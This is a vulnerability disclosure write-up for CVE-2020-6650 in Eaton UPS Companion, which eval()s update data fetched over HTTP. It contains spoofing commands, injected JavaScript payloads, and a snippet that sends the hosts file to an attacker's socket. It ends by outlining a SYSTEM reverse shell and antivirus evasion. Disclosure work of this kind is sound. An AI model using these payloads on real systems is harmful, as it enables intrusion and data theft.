## Overview

The Eaton UPS Companion software checks for an update every single week over an insecure HTTP connection
and `eval()`s the content of whatever is at the update URL. This allows an attacker to craft a JavaScript
function which uses the low-level OS operations that already exist in the backend software, like file
execution, network sockets, and filesystem I/O. All of these operations occur with NT AUTHORITY\SYSTEM
privileges likely due to the permissions a UPS (Uninterrupted Power Supply) needs for system management.
After waiting a while, automatic command injection that grants a SYSTEM shell occurs without effort.

[This has been fixed in version 1.06 and the CVE ID assigned is CVE-2020-6650.](https://www.eaton.com/content/dam/eaton/company/news-insights/cybersecurity/security-bulletins/eaton-vulnerability-advisory-UPS-companion-software.pdf)

#### Timeline (UTC+12)
|                   |                    |
|-------------------|--------------------|
| Bug noticed       | 2019/10/25 - 21:43 |
| Exploit realised  | 2019/12/28 - 06:28 |
| Reported to Eaton | 2019/12/28 - 10:00 |
| Acknowledged      | 2019/12/30 - 22:05 |
| Simple PoC sent   | 2020/01/04 - 03:32 |
| Being patched     | 2020/01/21 - 12:54 |
| Patched           | 2020/03/21 - 12:21 |

Thank you to Eaton for making this exploit's disclosure simple.

---

### Discovery Steps

Eaton UPS Companion gets updates from http://pqsoftware.eaton.com/upgrade/upgrade_euc.info

Issue 1: Can be easily spoofed via dsniff's `arpspoof` and `dnsspoof`, then `python -m http.server 80`.
Issue 2: Lack of HTTPS opens up another attack vector for the same effect.

As of 2019/10/25 - 22:08, this is the contents of the link:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// CHECK: |12ef94bf01265a99b04bab6263bbc0eba652ec3e|
{
  "EUC":
  {
    "WINDOWS":
    {
      "version": "1.04.017",
      "packageURL": "install/win32/euc/euc_win_1_04_017.exe",
      "info": "New release<br />More information here: <a href='http://pqsoftware.eaton.com' target='_blank'>Link to Eaton site</a><br />"
    }
  }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Cannot figure out how the SHA1 checksum for the file is calculated or what is used to calculate it,
but doing so would make this much simpler.

Eaton UPS Companion creates a local HTTP server at http://localhost:4679.
Clicking on "Version: Eaton UPS Companion v1.05" opens up a "hidden" debug log at http://localhost:4679/trace.html.
It can also be opened via ".\mc2.exe -start -debug" in `cmd.exe`

Serving an empty HTML page causes a prominent error that gets logged: 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
2019/10/25-21:32:29.051 | UpdateManager        | !!! ERROR: Update data could not be parsed: 
{
  "message": "syntax error", 
  "fileName": "scripts/libs/json.js", 
  "lineNumber": 122, 
  "stack": "()@:0\neval(\"()\")@:0\n(\"\") . . .
  "name": "SyntaxError"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

`eval()` is being used here, which makes it easier for us. Here is an example of UI manipulation,
where the content below goes into `update_euc.info`.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
UIManager.setCmd({action:'showMessage', id:'softwareUpgradeMessage', msg:System.getProductInfo(L('/Install/ServerUnreachable')), buttons:{ok:'/Misc/OK'}})
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This can be transformed into a proper function thanks to anonymous functions:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(function() {
        UIManager.setCmd({action:'showMessage', msg:System.getProductInfo(L('Ravjot was here 1.')), buttons:{ok:'Game Over 1'}});
        UIManager.setCmd({action:'showMessage', msg:System.getProductInfo(L('Ravjot was here 2.')), buttons:{ok:'Game Over 2'}});
})()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I believe there may be access to `ShutdownManager` as well, which is not good.

Going to http://localhost:4679/server/data_srv.js?action=init reveals more information about how the system works.
Regular JS functions like `alert()` don't exist and objects like `document`, `console` and `object` also don't exist.
Really old edition of ECMAScript or something? No `let` keyword either, just `var`.

This might help:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"stack": "()@:0\neval(\"()\")@:0\n(\"\")@scripts/libs/json.js:122\n((function (upgradeStatus) {trace(\"ui_cgf\", \"Check upgrade returns: '{0}'\", upgradeStatus);if (upgradeStatus == \"NEW_VERSION\") {UIManager.setCmd({action:\"showMessage\", id:\"softwareUpgradeMessage\", msg:S(L(\"/Install/SoftwareUpgradeLaunch\"), UpdateManager.updateData.version), buttons:{yes:\"/Misc/Yes\", no:\"/Misc/No\"}});} else if (upgradeStatus == \"UP_TO_DATE\") {UIManager.setCmd({action:\"showMessage\", id:\"softwareUpgradeMessage\", msg:L(\"/Install/NoSoftwareUpgradeAvailable\"), buttons:{ok:\"/Misc/OK\"}});} else if (upgradeStatus == \"SERVER_UNREACHABLE\") {UIManager.setCmd({action:\"showMessage\", id:\"softwareUpgradeMessage\", msg:System.getProductInfo(L(\"/Install/ServerUnreachable\")), buttons:{ok:\"/Misc/OK\"}});}}))@scripts/managers/update_manager.js:175\n(\"\")@scripts/configs/ui_cfg.js:1058\n([object Object])@scripts/managers/ui_manager.js:55\nsendData([object Object])@/server/data_srv.js:75\n([object Object],[object Object])@/server/data_srv.js:82\n([object Object])@scripts/libs/http_server.js:274\ncall([object Object],[object Object])@:0\n()@scripts/libs/core/thread.js:136\n@runThread:1\n",

UIManager.setCmd({action:'showMessage', id:'softwareUpgradeMessage', msg:S(L('/Install/SoftwareUpgradeLaunch'), UpdateManager.updateData.version), buttons:{yes:'/Misc/Yes', no:'/Misc/No'}});
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I can see all of the properties of the "manager" objects e.g. `UpdateManager` via:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(function() {
  for (var property in UpdateManager) {
    UIManager.setCmd({action:'showMessage', msg:System.getProductInfo(property + " IS " + UpdateManager[property]), buttons:{ok:'Game Over'}});
  }
})()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Doing that on the `UpdateManager` found these very interesting functions:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
selfUpdate IS function () {\n    var packagePath = UpdateManager.retrievePackage();\n    if (packagePath) {\n        ThreadPool.run(function () {var adminOK = System.getAdminRights();if (adminOK) {var installCmd = S(\"?/?\", File.getCurrentWorkingDir(), packagePath);var installPrm = \"-install -silent\";if (!File.status(\"scripts\")) {debug(\"UpdateManager\", \"Launching update package '? ?' ...\", installCmd, installPrm);System.open(installCmd, installPrm);} else {debug(\"UpdateManager\", \"Launching update package '? ?' muted\", installCmd, installPrm);}} else {error(\"UpdateManager\", \"Unable to get admin rights to launch upgrade\");}});\n    }\n}

retrievePackage IS function () {\n    var updateLocation = UpdateManager.updateLocation;\n    if (!UpdateManager.updateData) {\n        UpdateManager.checkForUpgrade();\n    }\n    if (!UpdateManager.updateData.packageURL) {\n        error(\"UpdateManager\", \"Unable to retrieve package url: UpdateManager.updateData = ?\", dump(UpdateManager.updateData, 2));\n        return false;\n    }\n    var packageURL = UpdateManager.updateData.packageURL;\n    var packagePath = S(\"?/?\", UpdateManager.outputPath, File.pathInfo(packageURL).file);\n    File.createPath(UpdateManager.outputPath);\n    if (File.status(packagePath)) {\n        debug(\"UpdateManager\", \"Update package '?' already in cache.\", packagePath);\n        return packagePath;\n    }\n    debug(\"UpdateManager\", \"Retrieving update package at '?'\", packageURL);\n    var client = new HTTPClient(updateLocation);\n    var response = client.get(packageURL);\n    if (response && response.status == 200) {\n        debug(\"UpdateManager\", \"Retrieved package at '?'\", packageURL);\n        try {\n            File.put(packagePath, response.data);\n            debug(\"UpdateManager\", \"Saved update package in file '?'\", packagePath);\n            return packagePath;\n        } catch (e) {\n            error(\"Failed to save update package at '?'\", packagePath);\n        }\n    } else {\n        debug(\"UpdateManager\", \"Failed to retrieve package at '?'\", packageURL);\n    }\n    return false;\n}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This manages to spell out that we can cause problems:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(function() {
  if (System.getAdminRights()) {
    UIManager.setCmd({action:'showMessage', msg:System.getProductInfo(L("Ravjot is admin.")), buttons:{ok:'Game Over'}});
  }
})()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

There's more useful function calls like `File.get("C:\\Windows\\System32\\drivers\\etc\\hosts")` which blurts out the
host file's content into a string, but only internally. After digging through the HTTPClient object's properties, there's
another object class that lets you create sockets.

For example, to receive the hosts file:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(function() {
  var hosts = File.get("C:\\Windows\\System32\\drivers\\etc\\hosts");
  var s = new Socket("tcp");
  s.connect("192.168.1.???", 44444);
  s.send(hosts);
  s.close;
 }
})()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Eventually, I discovered how `System.open(<file>, <args>)` works, which executes a file. From here, it's just uploading
a reverse shell, hushing any anti-virus solution (as we have SYSTEM privileges), and obtaining a reverse shell.
